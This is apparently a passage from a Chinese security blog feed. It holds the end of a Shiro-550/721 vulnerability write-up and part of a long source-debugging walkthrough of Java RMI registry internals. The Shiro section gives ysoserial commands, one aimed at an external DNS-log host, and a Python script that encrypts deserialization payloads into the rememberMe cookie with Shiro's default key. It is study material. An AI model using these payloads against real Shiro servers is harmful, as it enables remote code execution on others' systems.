title="image-20220317150255656"><p>可以看到在这里面直接就调用了readObject方法触发反序列化,没有经过其他过滤。</p><img src="/2022/03/17/shiro%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220317151129335.png" class title="image-20220317151129335"><h1 id="shiro550-利用"><a href="#shiro550-利用" class="headerlink" title="shiro550-利用"></a>shiro550-利用</h1><p>知道了整个触发过程以及密钥,那我们就可以开始尝试利用了</p><p>整个思路就是只需要将我们的恶意序列化payload利用我们获取到的密钥和iv值进行加密,然后放入cookie中的rememberMe字段发起攻击,服务端便会解密我们的payload然后调用readObject触发反序列化</p><p>利用URLDNS开一个探测payload,使用ysoserial生成URLDNS的Payload,运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar URLDNS &quot;http://c2b3ad5d.toxiclog.xyz&quot; &gt; payload</span><br></pre></td></tr></table></figure><p>python3加密payload脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPayload</span>():</span></span><br><span class="line">    payload = <span class="built_in">open</span>(<span class="string">&quot;payload&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()<span class="comment">#读取ysoserial生成的payload</span></span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><span class="comment">#默认密钥</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = <span class="string">b&#x27; &#x27;</span> * <span class="number">16</span><span class="comment">#设置iv值</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)<span class="comment">#设置AES加密模式</span></span><br><span class="line">    file_body = pad(payload)</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    print(base64_ciphertext.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getPayload()</span><br></pre></td></tr></table></figure><p>执行结果:</p><img src="/2022/03/17/shiro%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220317152834774.png" class title="image-20220317152834774"><p>替换rememberMe</p><img src="/2022/03/17/shiro%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220317152955359.png" class title="image-20220317152955359"><p>收到请求</p><img src="/2022/03/17/shiro%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220317152934215.png" class title="image-20220317152934215"><p>利用CommonsBeanutils1链实现rce,这里有个需要注意的地方,commons-beanutils版本在1.9.2才能触发</p><img src="/2022/03/17/shiro%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220317153424852.png" class title="image-20220317153424852"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 &quot;calc&quot; &gt; payload  </span><br></pre></td></tr></table></figure><p>弹出计算器</p><img src="/2022/03/17/shiro%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220317153143034.png" class title="image-20220317153143034"><h1 id="shiro721"><a href="#shiro721" class="headerlink" title="shiro721"></a>shiro721</h1><p>shiro721和550在加解密部分没有啥区别</p><p>在shiro721(shiro&lt;1.4.2)版本中,虽然修改了shiro550的密文获取方式,但是忽略了一点,整个AES加密就是可以被利用CBC反转攻击破解的,在获得一个合法的rememberMe后通过这个合法的rememberMe的值可以爆破出密钥,达到利用效果</p><p>由于爆破这个需要花费的时间比较长而且利用原理和550基本一样,就不展开赘述了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言:&quot;&gt;&lt;/a&gt;前言:&lt;/h1&gt;&lt;p&gt;经过一段时间的java安全知识的学习,对整个java安全的认知也进一步加深,平时耳熟能详的shiro也来到了我的java安全学习日程中,</summary>
      
    
    
    
    
    <category term="Java代码审计" scheme="https://men9da.cn/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="shiro" scheme="https://men9da.cn/tags/shiro/"/>
    
  </entry>
  
  <entry>
    <title>通过调试源码深入理解分析RMI运行机制(长文)</title>
    <link href="https://men9da.cn/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/"/>
    <id>https://men9da.cn/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/</id>
    <published>2022-03-10T12:03:49.000Z</published>
    <updated>2022-03-23T07:20:09.737Z</updated>
    
    <content type="html"><![CDATA[<h1 id="阅读本篇文章前注意事项"><a href="#阅读本篇文章前注意事项" class="headerlink" title="阅读本篇文章前注意事项"></a>阅读本篇文章前注意事项</h1><p>如果你是初次接触RMI,JNDI等概念,请先理解阅读我写的另一篇文章”RMI-JNDI初探”,个人认为整个RMI的运行机制还是非常复杂的,因为他在整个调用的过程中是多线程的,有非常非常多的坑点,本篇文章将以RMI运行过程为大纲,深入剖析其运行原理。</p><p><strong>本篇文章运行环境为JDK7U80</strong></p><p>[TOC]</p><h1 id="第一步-服务端开启注册服务"><a href="#第一步-服务端开启注册服务" class="headerlink" title="第一步:服务端开启注册服务"></a>第一步:服务端开启注册服务</h1><p><strong>调试代码:</strong></p><p>Server端:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Registry registry &#x3D; LocateRegistry.createRegistry(1099);</span><br></pre></td></tr></table></figure><p>Client端:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Registry registry &#x3D; LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);</span><br><span class="line">registry.lookup(&quot;hello&quot;);</span><br></pre></td></tr></table></figure><p>一切准备就绪,跟随Server端的启动进入RMI的调用旅程</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220310204901346.png" class title="image-20220310204901346"><p>跟进后首先便是实例化RegistryImpl对象</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220310205209903.png" class title="image-20220310205209903"><p>进入RegistryImpl类的构造函数,实例化一个LiveRef对象,var2就是端口号1099,此时this为RegistryImpl,调用RegistryImpl的setup方法</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311171043640.png" class title="image-20220311171043640"><p>setup方法中将var1(unicastServerRef给this.ref),然后调用unicastServerRef的exportObject方法,此方法会将对应对象暴露对应1099端口上,我们接下来跟进这个方法</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311171326246.png" class title="image-20220311171326246"><p>exportObject中首先就获取var1(RegistryImpl)方法的字节码,明显是准备进行反射实例化RegistryImpl对象</p><p>在85行Util.createProxy中创建一个存根对象,继续跟进createProxy</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311171511173.png" class title="image-20220311171511173"><p>看到第55行调用createStub返回了一个Stub(存根)对象</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311194434277.png" class title="image-20220311194434277">跟进createStub,很明显通过反射实例化RegistryImpl_Stub对象并将其类型转换为RemoteStub后返回<img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311194510896.png" class title="image-20220311194510896"><p>回到刚刚的UnicastServerRef#exportObject方法中,看右下角Variables窗口,此时var5就是刚刚我们创建的RegistryImpl_Stub对象,在第91行判断var5是否为Stub对象,如果是就创建服务器骨架(skeleton),在第94行处将刚刚我们创造的对象全部和LiveRef(this.ref为LiveRef)的objID打包为一个大的Target对象(var6),将这个大对象继续传递给LiveRef的exportObject方法</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311194719764.png" class title="image-20220311194719764"><p>继续往下分析,发现是一波套娃调用,此时this.ep代表TCPEndpoint,接着调用TCPEndpoint的exportObject方法</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311195048763.png" class title="image-20220311195048763"><p>继续套娃,调用TCPTransport方法的exportObject方法跟进</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311195227524.png" class title="image-20220311195227524"><p>来到TCPTransport#exportObject方法中,151行处的this.listen()将会开启1099端口的监听,这个步骤涉及到其他线程的启动,我们跟进this.listen()</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311195427510.png" class title="image-20220311195427510"><p>233行this.getEndpoint()获取到本地ip,224行var1.getpor()获取到对应端口,直接便来到第231行,开启一个处于1099端口的监听</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311195651492.png" class title="image-20220311195651492"><p>我们此时运行231行代码,查看本机监听会发现1099端口已经开启了监听服务了</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311195855491.png" class title="image-20220311195855491"><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311195927952.png" class title="image-20220311195927952"><p>然后往下,这里创建了一个进程,进程名字叫做TCP-Accept-端口号,此时var2为1099,于是我们便在这一行创建了一个名为TCP-Accept-1099的线程,用来接收客户端请求,然后调用var3.start();开启这个线程</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311200007832.png" class title="image-20220311200007832"><p>此时已经开启了TCP-Accept-1099线程,我们暂时让主线程先暂停到刚刚的this.listen()后面,跟进TCP-Accept-1099线程,跟进这个excuteAcceptLoop</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311200300801.png" class title="image-20220311200300801"><p>我们发现在这个里面运行到366行this.serverSocker.accept()线程便暂停等待客户端的请求了,准备接受客户端传来的信息</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311200407840.png" class title="image-20220311200407840"><p>这个时候我们运行我们的客户端代码,代码继续运转,此时wireshark查看1099端口流量包发现在此刻成功建立TCP链接并且执行了一次有客户端发向服务器的RMI通信</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311200808841.png" class title="image-20220311200808841">其内容为0x4a524d49(JRMI的16进制),用于java确认此包是JRMI的<img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311201025171.png" class title="image-20220311201025171"><p>回到刚刚的代码继续往下,在371行处又新建了一个进程,进程名为RMI TCP Connection</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311201345570.png" class title="image-20220311201345570"><p>直接步过第371行代码,线程RMI TCP Connection启动,切换到RMI TCP Connection线程</p><p>来到TCPTransport#run,跟进run0()方法</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311202007302.png" class title="image-20220311202007302"><p>run0方法中开始读取客户端发送的第一个数据包,从第515行开始读取socket的输入流,然后接着一波转换和读取,最后在519行的var6 = var5.readInt()获取到了数据,此时var6为1246907721,它的16进制数据即为0x4a524d49(我们刚刚从wireshark中看到的第一次JRMI通信客户端发给服务器的包的内容也为0x4a524d49),满足537行的if判断,进入537行if内的</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311202637127.png" class title="image-20220311202637127"><p>来到了处理JRMI协议的逻辑中,此时读取第二个数据包,在第546行byte var15 = var5.readByte();处读取var5的一个字节,var5就是刚刚客户端-&gt;服务端的数据包(0x4a524d49),一个字节即为0x4a(75)所以我们会进入case75的代码段,开始构造返回包。在第552行向DataOutputStream中写入78(16进制为0x4e),随后调用var10.flush()发送返回包,后面仍然是一些数据包读取,但是都没有什东西,直接跟进569行TCPTransport.this.handleMessages(var14, true)</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311203115842.png" class title="image-20220311203115842"><p>客户端收到的返回包</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311205641982.png" class title="image-20220311205641982"><p>此时又开始读取客户端发送的第三个数据包(这个数据包是Registry.lookup的数据包,后面会讲到),此时wireshark显示并没有再次客户端没有进行发包,意味着客户端再一次传输中发了多个数据包,此时var5是80(16进制0X50),进入case80,进入279行StreamRemoteCall.serviceCall()</p><p><strong>JRMI协议方法介绍</strong>:</p><p>Message: Call Ping DgcAck</p><p>Call: 0x50 CallData</p><p>Ping: 0x52</p><p>DgcAck: 0x54 UniqueIdentifier</p><p>Call、Ping 和 DgcAck。Call 将对方法调用进行编码。Pin<br>g 是一个传输级消息，用于测试远程虚拟机的活动性。DGCAck 是一个对服务器的<br>分布式垃圾收集器的确认，指示客户机已经接收到服务器返回值中的远程对象。</p><p>此处case80(0x50)代表业务方法(Call),如lookup,bind等</p><p>case82(0x52)代表心跳包(Ping)</p><p>case84(0x54)代表DgcAck包</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311204954482.png" class title="image-20220311204954482"><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311205818248.png" class title="image-20220311205818248"><p>来到StreamRemoteCall#serviceCall,此时77行var39去读取InputStream中序列化数据的BlockData块,然后在第83行从ObjectTable中获取Target,此时我们已经很久没有见到我们的主线程了,我们回到主线程看一下</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311210150941.png" class title="image-20220311210150941"><p>可以看到图中框起来的0X50刚刚已经读入了,用来判断行为,此时是call行为,代表将方法调用进行编码,然后0xaced后应该就是序列化的数据了</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311212042435.png" class title="image-20220311212042435"><p>此时主线程的状态是这样的,刚刚说了我们要从ObjectTable中去获取Target,但是现在主线程还没有将Target放入ObjetcTable中,看到160行代码,调用TCPTransport的父类Transport的exportObject方法,将Target放入ObjectTable</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311212950113.png" class title="image-20220311212950113"><p>Transport#exportObject如下,可以看到调用ObjectTable.putTarget将target放入ObjectTable,现在我们继续回到我们的RMI TCP Connection线程中</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311213145483.png" class title="image-20220311213145483"><p>可以看到,此时var5已经从ObjectTable中获取到了Target,继续进入if语句</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311213332409.png" class title="image-20220311213332409"><p>在if语句内看到第85行,此时调用了UnicastServerRef#dispatch方法</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311213417306.png" class title="image-20220311213417306">继续跟进this.oldDispatch(this:UnicastServerRef)方法<img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311213721636.png" class title="image-20220311213721636"><p>加载了一个类以及一些操作后从224行进入了最终的RegistryImpl_Skel#dispatch方法</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311213926415.png" class title="image-20220311213926415"><p>这个里面出现了一些case语句,是用来判断执行了哪些操作,对应关系</p><p>0-&gt;bind<br>1-&gt;list<br>2-&gt;lookup<br>3-&gt;rebind<br>4-&gt;unbind</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311214113235.png" class title="image-20220311214113235"><p>此时继续往下直接调用ObjectInputStream#readObject,触发反序列化</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220311214338329.png" class title="image-20220311214338329"><p>所以这里的关系就是先反序列化传输过来的序列化对象,然后再根据对应的操作如bind,lookup进入对应的代码块执行相应操作.</p><p><strong>整个流程调用图如下,点击图片查看原图:</strong></p><h6 id="RMI-创建注册中心调用流程图"><a href="#RMI-创建注册中心调用流程图" class="headerlink" title="RMI-创建注册中心调用流程图"></a>RMI-创建注册中心调用流程图</h6><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/RMI%E8%B0%83%E7%94%A8%E5%9B%BE-%E5%88%9B%E5%BB%BA%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83.png" class title="RMI调用图-创建注册中心"><h1 id="第二步-客户端获取注册中心"><a href="#第二步-客户端获取注册中心" class="headerlink" title="第二步:客户端获取注册中心"></a>第二步:客户端获取注册中心</h1><p><strong>调试代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br></pre></td></tr></table></figure><p>第一步我们创建注册中心创建的是RegistryImpl对象</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220312181802825-16470802831151.png" class title="image-20220312181802825"><p>而我们客户端获取到的注册中心是RegistryImpl_Stub对象</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220312181935873.png" class title="image-20220312181935873"><p>我们跟进getRegistry,在LocateRegistry#getRegistry中调用Util.createProxy创建一个RegistryImpl的存根类实例</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220312182703691.png" class title="image-20220312182703691"><p>Util#createProxy中调用createStub返回一个registryImpl_Stub对象</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220312182927937.png" class title="image-20220312182927937">具体细节可以看到同样是通过反射加载registryImpl_Stub对象并返回<img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220312183037778.png" class title="image-20220312183037778"><p>值得注意的一点是这个过程并没有与客户端交互,整个获取注册中心并不是从服务器上获取服务端创建的那个注册中心,而是自己实例化一个注册中心的存根对象registryImpl_Stub,此处其实就是创建一个registryImpl对象的代理registryImpl_Stub,之后客户端与服务端交互通过这个代理对象进行交互,由于这个步骤调用比较简单,所以就不画调用流程图了</p><h1 id="第三步-创建远程对象"><a href="#第三步-创建远程对象" class="headerlink" title="第三步:创建远程对象"></a>第三步:创建远程对象</h1><p><strong>调试代码:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">interface HelloService extends Remote &#123;</span><br><span class="line">    String sayHello() throws RemoteException;</span><br><span class="line">&#125;</span><br><span class="line">class HelloServiceImpl extends UnicastRemoteObject implements HelloService &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        System.out.println(&quot;静态代码块&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    protected HelloServiceImpl() throws RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String sayHello() throws RemoteException &#123;</span><br><span class="line">        System.out.println(&quot;此处在程序A中被调用&quot;);</span><br><span class="line">        System.out.println(Runtime.getRuntime());</span><br><span class="line">        return &quot;程序B接收到返回值!&quot;;</span><br><span class="line">    &#125;</span><br><span 